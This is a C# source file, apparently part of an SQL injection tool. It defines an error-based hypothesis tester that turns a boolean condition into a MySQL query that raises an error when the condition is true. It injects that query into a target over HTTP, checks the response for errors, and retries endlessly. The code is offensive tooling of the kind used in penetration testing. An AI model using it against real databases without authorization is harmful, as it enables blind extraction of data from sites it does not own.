using System;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using System.Diagnostics;
using System.Net.Http;
using System.Threading;
using System.Linq.Expressions;

namespace PeterJuhasz.SqlInjection
{
    public class ErrorBasedHypothesisTester : IHypothesisTester
    {
        public ErrorBasedHypothesisTester(
            SqlWriter writer,
            IErrorBasedInjector injector,
            IErrorExpressionProvider errorExpressionProvider,
            IErrorDetector errorDetector,
            ILogger<ErrorBasedHypothesisTester> logger
        )
        {
            Writer = writer;
            Injector = injector;
            ErrorExpressionProvider = errorExpressionProvider;
            ErrorDetector = errorDetector;
            Logger = logger;
        }

        public SqlWriter Writer { get; }
        public IErrorBasedInjector Injector { get; }
        public IErrorExpressionProvider ErrorExpressionProvider { get; }
        public IErrorDetector ErrorDetector { get; }
        public ILogger<ErrorBasedHypothesisTester> Logger { get; }

        public async Task<bool> TestAsync(IQueryable<bool> query)
        {
            if (query == null)
                throw new ArgumentNullException(nameof(query));

            var expr = ErrorExpressionProvider.GetErrorExpression();
            
            var p = Expression.Parameter(typeof(bool), "condition");
            var next = query.Provider.CreateQuery<long>(
                Expression.Call(
                    typeof(Queryable).GetMethods().Where(m => m.Name == nameof(System.Linq.Queryable.Select)).Single(m => !m.GetParameters()[1].ParameterType.ToString().Contains("Int32"))
                        .MakeGenericMethod(typeof(bool), typeof(long)),
                    query.Expression,
                    Expression.Lambda(
                        Expression.Condition(
                            p,
                            expr,
                            Expression.Constant(1L)
                        ),
                        p
                    )
                )
            ).Take(1);

            Writer.Clear();
            var visitor = new MySqlQueryModelVisitor(Writer);
            var sql = visitor.Render(next);

            Logger.LogDebug(sql);

            while (true)
            {
                try
                {
                    using (var response = await Injector.InjectAsync(sql, CancellationToken.None))
                        return await ErrorDetector.ContainsErrorAsync(response);
                }
                catch (HttpRequestException req) when (req.InnerException?.Message?.Contains("timed out") ?? false)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
                catch (HttpRequestException req) when (req.InnerException?.Message?.Contains("unrecognized response") ?? false)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
                catch (OperationCanceledException)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
            }
        }
    }
}
